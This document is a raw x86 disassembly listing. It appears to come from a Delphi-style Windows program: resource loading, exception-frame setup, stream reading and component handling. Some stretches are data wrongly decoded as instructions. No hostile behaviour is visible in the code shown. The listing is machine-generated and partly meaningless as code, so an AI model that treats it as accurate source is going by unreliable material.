mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41c9c4
sub_41caf4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403224
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_404464
mov ecx eax
mov edx esi
mov eax edi
call sub_41cbbc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_41cb4c
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41cbaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cbb6
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
sub_41cbbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41cb4c
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41c8e4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41cb4c
pop ecx
sub_41cc28
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406e18
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_41cc78
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4027c4
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_41ccc0
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4027e4
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_41ccf0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xcd
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x33 ] dl
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x11 ] al
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
into
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ eax ] dl
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ eax + eax ] dl
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ esi + ecx * 8 + 0x41 ] dh
add [ esi ] cl
push esp
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
mov al 0xcd
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 8 + 0x180041 ] dh
add [ eax ] al
in al dx
int3
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404094
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404504
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403ff8
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403ff8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41cdc4
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403ff8
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403ff8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_41ce1c
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404094
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404504
mov al 0x1
inc ebx
sub_41ce74
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ceeb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405a08
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_417724
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cef2
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_4168b0
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_405a08
mov ecx eax
mov eax esi
pop edx
call sub_40d7bc
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405a08
sub_41cef8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41cf9e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cfa5
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404094
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4204cc
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_4081d4
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41cfc0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41a62c
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41a62c
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41a474
sub_41cff8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41a62c
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41a62c
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_41a4c0
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41a474
sub_41d040
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41d1d9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_41a978
mov edi eax
xor edx edx
push ebp
push sub_41d1ba
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d1c1
mov eax [ rw-data ]
call sub_41a9dc
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41d19b
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41d149
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_41a5d0
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41a11c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d150
mov eax [ ebp - 0x8 ]
call sub_403254
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_416aec
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41cfc0
pop ecx
mov edx esi
mov eax edi
call sub_41a4c0
mov eax ebx
call sub_403254
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41cef8
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41cff8
pop ecx
inc esi
sub_41d150
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403254
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41a5d0
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
sub_41d1e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_41a978
mov edi eax
xor eax eax
push ebp
push sub_41d283
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a9dc
retn
mov edx ebx
mov eax edi
call sub_41a5d0
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_41a4c0
mov eax esi
call sub_403254
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4081d4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41d294
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_41a978
mov edi eax
xor eax eax
push ebp
push sub_41d30b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a9dc
retn
mov edx ebx
mov eax edi
call sub_41a5d0
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_41a4c0
mov eax esi
call sub_403254
sub_41d33c
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
pop ecx
pop edx
pop ebx
retn
sub_41d380
push ebx
push esi
push edi
call sub_4035e0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41ccc0
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_41d3bc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41f294
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41f3a4
call sub_41d330
sub_41d3e0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_4081d4
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403fa4
sub_41d414
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_4081d4
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f294
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41d4d5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41d858
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41d858
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d4dc
mov eax [ ebp - 0x8 ]
call sub_403254
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41f3a4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41d330
sub_41d504
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41d524
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404240
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4034d8
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41d330
sub_41d58c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_41a978
mov esi eax
xor edx edx
push ebp
push sub_41d5fc
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d603
mov eax [ rw-data ]
call sub_41a9dc
retn
mov edx ebx
mov eax esi
call sub_41a5d0
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403254
mov edx ebx
mov eax esi
call sub_41a4c0
sub_41d608
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d717
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d71e
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
xor edx edx
push ebp
push sub_41d6fa
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d74c
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41ce1c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_41a5d0
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_40403c
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41cef8
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_41a5d0
call sub_41d58c
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_41a5d0
mov edx eax
mov eax [ rw-data ]
call sub_41a8f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_41a6c4
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41d728
push ebx
mov ebx eax
mov eax ebx
call sub_41d81c
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41c284
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41d74c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403254
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_41a5d0
call sub_403254
inc edi
dec esi
jne r-xdata
sub_41d788
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_40319c
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_419c64
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4031e0
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_419cdc
mov edi eax
mov edx [ esp + 0x4 ]
call sub_419bdc
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4031b8
test al al
jne r-xdata
sub_41d858
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41d8a4
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41d8a4
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
sub_41d8f4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41d93f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41f0f4
mov eax [ ebp - 0x4 ]
call sub_404264
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d946
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
call sub_41d330
sub_41d94c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41d9ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41d4f0
test al al
jne r-xdata
mov eax ebx
call sub_41d4f0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ae44
jmp r-xdata
mov eax ebx
call sub_41d834
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41e45c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d9f3
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_41ae24
mov esi eax
mov eax ebx
call sub_41e454
jmp r-xdata
mov eax ebx
call sub_41e3a4
mov eax ebx
call sub_41d4f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41e5c0
mov eax ebx
call sub_41e45c
sub_41da1c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40504c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_41a474
inc esi
dec ebx
jne r-xdata
sub_41da58
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_4205e8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40504c
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405208
add esp 0x4
mov edx ebx
mov eax edi
call sub_4205bc
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40504c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_4205bc
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41dad0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40504c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41db38
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41db58
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_402854
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41db38
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41f588
call sub_402854
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
